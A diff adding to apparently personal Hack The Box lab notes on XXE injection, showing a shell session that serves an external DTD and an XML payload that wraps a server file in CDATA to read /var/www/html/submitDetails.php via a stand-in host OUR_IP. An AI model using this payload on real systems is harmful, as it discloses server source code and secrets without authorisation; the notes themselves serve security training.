@@ -74,6 +74,25 @@ done
   <!ENTITY joined "&begin;&file;&end;">
 ]>
 ```
+
+```
+Mdmithu@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
+Mdmithu@htb[/htb]$ python3 -m http.server 8000
+
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+```
+Code: xml
+<!DOCTYPE email [
+  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
+  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
+  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
+  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
+  %xxe;
+]>
+...
+<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
+```
 ## Advanced File Disclosure
 
 >**Q. Use either method from this section to read the flag at '/flag.php'. (You may use the CDATA method at '/index.php', or the error-based method at '/error').**
